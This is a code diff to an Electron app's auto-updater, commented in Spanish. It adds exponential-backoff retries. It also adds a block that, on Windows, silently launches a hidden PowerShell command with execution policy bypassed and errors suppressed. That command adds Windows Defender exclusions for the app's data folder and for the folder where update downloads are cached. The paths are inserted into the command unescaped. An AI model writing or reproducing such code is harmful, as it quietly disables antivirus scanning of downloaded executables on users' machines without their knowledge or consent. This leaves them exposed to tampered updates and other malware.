@@ -164,6 +164,24 @@ function setupAutoUpdater() {
   console.log('[updater] Configurando auto-updater...');
   console.log('[updater] App version:', app.getVersion());
 
+  // Redirigir descarga a userData/Updates (excluido de Defender por el instalador)
+  const updatesDir = path.join(app.getPath('userData'), 'Updates');
+  if (!fs.existsSync(updatesDir)) {
+    fs.mkdirSync(updatesDir, { recursive: true });
+  }
+  autoUpdater.cachePath = updatesDir;
+
+  // Asegurar exclusión de Defender para la carpeta de Updates
+  // (cubre casos donde el instalador anterior no aplicó las exclusiones correctamente)
+  if (process.platform === 'win32') {
+    const { exec } = require('child_process');
+    const userDataDir = app.getPath('userData');
+    const cmd = `powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command "try { Add-MpPreference -ExclusionPath '${userDataDir}' -Force -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath '${updatesDir}' -Force -ErrorAction SilentlyContinue } catch {}"`;
+    exec(cmd, () => {
+      console.log('[updater] Exclusiones de Defender aplicadas para:', userDataDir);
+    });
+  }
+
   autoUpdater.on('checking-for-update', () => {
     console.log('[updater] Buscando actualizaciones...');
   });
@@ -204,7 +222,6 @@ function setupAutoUpdater() {
 
   autoUpdater.on('error', (err) => {
     console.error('[updater] Error:', err.message);
-    console.error('[updater] Stack:', err.stack);
     if (mainWindow) {
       mainWindow.webContents.send('update-error', {
         message: err.message
@@ -212,13 +229,24 @@ function setupAutoUpdater() {
     }
   });
 
-  // Check for updates after window is ready
-  setTimeout(() => {
-    console.log('[updater] Iniciando busqueda de actualizaciones...');
-    autoUpdater.checkForUpdates().catch(err => {
-      console.error('[updater] Error buscando actualizaciones:', err.message);
-    });
-  }, 5000);
+  // Buscar actualizaciones con reintentos y backoff exponencial
+  let checkAttempt = 0;
+  const MAX_CHECK_ATTEMPTS = 3;
+
+  function scheduleCheck(delayMs) {
+    setTimeout(() => {
+      checkAttempt++;
+      console.log(`[updater] Buscando actualizaciones (intento ${checkAttempt})...`);
+      autoUpdater.checkForUpdates().catch(err => {
+        console.error('[updater] Error buscando actualizaciones:', err.message);
+        if (checkAttempt < MAX_CHECK_ATTEMPTS) {
+          scheduleCheck(delayMs * 2);
+        }
+      });
+    }, delayMs);
+  }
+
+  scheduleCheck(5000);
 }
 
 // ============================================
